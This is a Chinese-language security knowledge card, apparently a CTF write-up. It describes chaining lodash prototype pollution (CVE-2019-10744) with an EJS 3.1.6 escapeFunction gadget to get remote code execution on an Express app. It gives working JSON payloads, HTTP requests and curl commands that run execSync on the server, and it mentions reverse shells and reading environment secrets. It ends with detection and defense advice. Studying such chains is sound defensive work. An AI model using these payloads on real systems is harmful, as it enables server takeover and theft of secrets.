---
id: web-nodejs-prototype-pollution-lodash-ejs-escapefunction-rce
title: lodash 原型链污染（CVE-2019-10744）+ EJS 3.1.6 escapeFunction 注入 RCE
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: lodash-prototype-pollution-ejs-escapefunction-rce
aliases:
- CVE-2019-10744
- lodash 原型链污染
- EJS 3.1.6 RCE
- escapeFunction
- prototype pollution EJS
- constructor.prototype.client
- Express EJS RCE
tags:
- nodejs
- prototype-pollution
- lodash
- ejs
- rce
- express
- cve-2019-10744
- template-engine
- ctf
cve:
- CVE-2019-10744
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: EJS 3.1.6
verification:
  verified_by: verifier-V195
  verified_at: '2026-11-06T23:11:44+08:00'
  notes: 已对照原文核对；EJS 3.1.6 为原文目标/gadget 版本；CVE-2019-10744 与 lodash 深合并链、payload 与截图一致；未在目标复跑。
---

## 一句话结论

当 Express 应用把用户 JSON 交给 lodash 的 `merge`/`defaultsDeep` 等深合并函数（CVE-2019-10744 影响版本）处理时，攻击者可用 `{"constructor":{"prototype":{...}}}` 污染 `Object.prototype`；再向原型写入 EJS 3.1.6 使用的 `client=true` 与 `escapeFunction=<JS 代码>`，访问任意 EJS 页面时模板引擎会执行被污染的 `escapeFunction`，从而以 Node 进程权限执行 `child_process.execSync('cat /flag')`。

## 原理

- **lodash 深合并的原型链污染**：lodash 的 `merge`/`defaultsDeep` 等函数在递归合并对象时会遍历 `constructor`、`prototype` 等键；未修复版本（CVE-2019-10744）没有阻止把这些键写到 `Object.prototype` 上。攻击者提交 `{"constructor":{"prototype":{"client":true,"escapeFunction":"..."}}}`，合并后所有普通对象都会“继承”`client` 与 `escapeFunction` 属性。
- **EJS 的选项继承**：EJS 3.1.6 在渲染时会从传入的 options/data 中读取 `client`、`escapeFunction` 等配置；由于这些属性被污染到 `Object.prototype`，即使路由没有显式传入，EJS 也会从原型链上读到攻击者的值。
- **escapeFunction 被当作代码执行**：EJS 的 `escapeFunction` 选项预期是一个函数或函数体字符串；在 client 模式下，EJS 会用 `new Function`/`Function` 构造并调用它。攻击者写入 `1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString(); //`，函数体先执行 `execSync` 读取 flag，再 `return` 命令输出；末尾 `//` 注释掉模板引擎追加的代码，避免语法错误。
- **`client=true` 的作用**：EJS 的 client 模式会走另一条编译/渲染路径，使 `escapeFunction` 被实际使用；两者配合才能稳定触发。不同 EJS 版本/调用方式可能需要调整 `client`、`escapeFunction` 或 `outputFunctionName` 等 gadget 字段。
- **为什么成立**：原型链污染把攻击者数据变成了“全局默认配置”，而 EJS 信任 options 中的函数体字符串并用动态函数执行；根因是“不可信 JSON 进入深合并”+“模板引擎把配置当代码”。这不是 EJS 单点漏洞，而是 lodash 污染与 EJS gadget 的组合链。
- **利用前置**：原文先通过硬编码 PRNG 种子预测 admin 密码进入后台（见关联卡片），再对 `/addUser` 发送污染 JSON；污染后访问 `/admin` 或任意 EJS 页面触发渲染，响应中返回命令输出/flag。

## 触发条件

- Node.js/Express 应用使用受影响版本的 lodash，并把用户可控 JSON 传入 `merge`/`defaultsDeep`/`set` 等深合并/路径赋值函数。
- 应用使用 EJS 3.1.6（或存在 `escapeFunction`/`outputFunctionName` 等可被原型污染影响的 gadget 的版本），且渲染时从 options 继承属性。
- 攻击者能向触发深合并的接口提交 JSON（本例 `/addUser`），并能访问至少一个 EJS 渲染页面。
- 服务端没有对 `__proto__`、`constructor`、`prototype` 键做过滤；Node 进程有读取目标文件/执行命令的权限。
- 若后台需要登录，先通过弱口令/PRNG 预测等方式取得入口。

## 利用步骤

1. 确认入口：抓取 `/addUser` 等接收 JSON 的接口，测试提交 `{"constructor":{"prototype":{"x":"y"}}}` 后是否能在后续响应/对象中看到 `x`（或使用本地同版本 lodash 复现）。
2. 构造污染 payload：
   ```json
   {
     "constructor": {
       "prototype": {
         "client": true,
         "escapeFunction": "1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString(); //"
       }
     }
   }
   ```
3. POST 到触发深合并的接口（本例 `/addUser`，Content-Type: application/json）；确认返回 302/成功，说明污染已写入。
4. 访问任意 EJS 渲染页面（本例 `/admin` 或首页），触发模板编译/渲染；`escapeFunction` 被执行，命令输出出现在响应中。
5. 若 `cat /flag` 无回显，改用 `execSync('id')`、写文件、反弹 shell 或 `process.env` 读取；根据 EJS 版本调整 gadget（`client`、`escapeFunction`、`outputFunctionName`、`localsName` 等）。
6. 清理/验证：重启 Node 进程可清除原型污染；在修复前避免再次触发。

## PoC

HTTP 请求（原文核心）：

```http
POST /addUser HTTP/2
Host: target:3000
Content-Type: application/json
Cookie: session=<admin session>

{
  "constructor": {
    "prototype": {
      "client": true,
      "escapeFunction": "1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString(); //"
    }
  }
}
```

随后访问任意 EJS 页面：

```http
GET /admin HTTP/2
Host: target:3000
Cookie: session=<admin session>
```

响应中返回命令输出/flag。等价 curl：

```bash
curl -s -X POST 'http://target:3000/addUser' \
  -H 'Content-Type: application/json' \
  -b 'session=<admin session>' \
  --data '{"constructor":{"prototype":{"client":true,"escapeFunction":"1; return global.process.mainModule.constructor._load('"'"'child_process'"'"').execSync('"'"'cat /flag'"'"').toString(); //"}}}'
curl -s 'http://target:3000/admin' -b 'session=<admin session>'
```

本地验证 lodash 污染（同版本环境）：

```js
const _ = require('lodash');
_.merge({}, JSON.parse('{"constructor":{"prototype":{"polluted":"yes"}}}'));
console.log({}.polluted);   // yes（受影响版本）
```

## 变体与关联

- 变体：把 `escapeFunction` 换成 `outputFunctionName`、`localsName`、`destructuredLocals` 等 EJS 选项 gadget；不同 EJS 版本可用的字段不同。
- 变体：lodash 的 `defaultsDeep`、`set`、`merge` 等不同入口都可能污染；也可用 `__proto__` 代替 `constructor.prototype`（视过滤/版本）。
- 变体：不依赖 EJS，可把污染导向其它库的 gadget（如 `child_process` 选项、模板引擎、序列化库），形成不同的原型链污染 RCE。
- 关联：[[crypto-prng-hardcoded-seed-custom-lcg-admin-password-predict]]（本例先预测 admin 密码进入后台）、[[ctf-web-ezlog-prototype-inherited-nonce-query-array-traversal]]（原型继承绕过）、[[ctf-web-flask-node-file-read-prototype-pollution-ssti-chain]]（原型污染 + 模板链）、[[web-nodejs-n8n-encryptionkey-jwt-forgery-admin-takeover]]（Node 应用配置/密钥问题）。
- 边界：lodash 已升级到修复版本、应用过滤 `__proto__`/`constructor`/`prototype`、EJS 版本不存在可用 gadget、或污染后没有 EJS 渲染路径时，该链不成立。

## 检测与防御

- **修复**：升级 lodash 到修复版本（≥4.17.12 等官方安全版本）；升级 EJS 到最新版本；避免把用户 JSON 直接交给 `merge`/`defaultsDeep`/`set`。
- **输入过滤**：递归拒绝 `__proto__`、`constructor`、`prototype` 键；使用 `Object.create(null)` 或无原型对象接收用户数据；对 JSON schema 做严格白名单。
- **模板加固**：不要把用户可控的 options 传入 EJS；禁用/限制 `escapeFunction` 等动态函数配置；使用沙箱模板引擎或预编译模板。
- **检测**：监控请求体中出现 `"constructor"` + `"prototype"`、`escapeFunction`、`outputFunctionName`、`__proto__` 等组合；检测 Node 进程异常 `child_process` 调用与 EJS 渲染时的命令输出；对 `/addUser` 等 JSON 接口做异常键告警。
- **响应**：重启 Node 进程清除污染，轮换密钥/会话，检查是否写入持久化或横向移动；修复后复测污染 payload 是否仍生效。
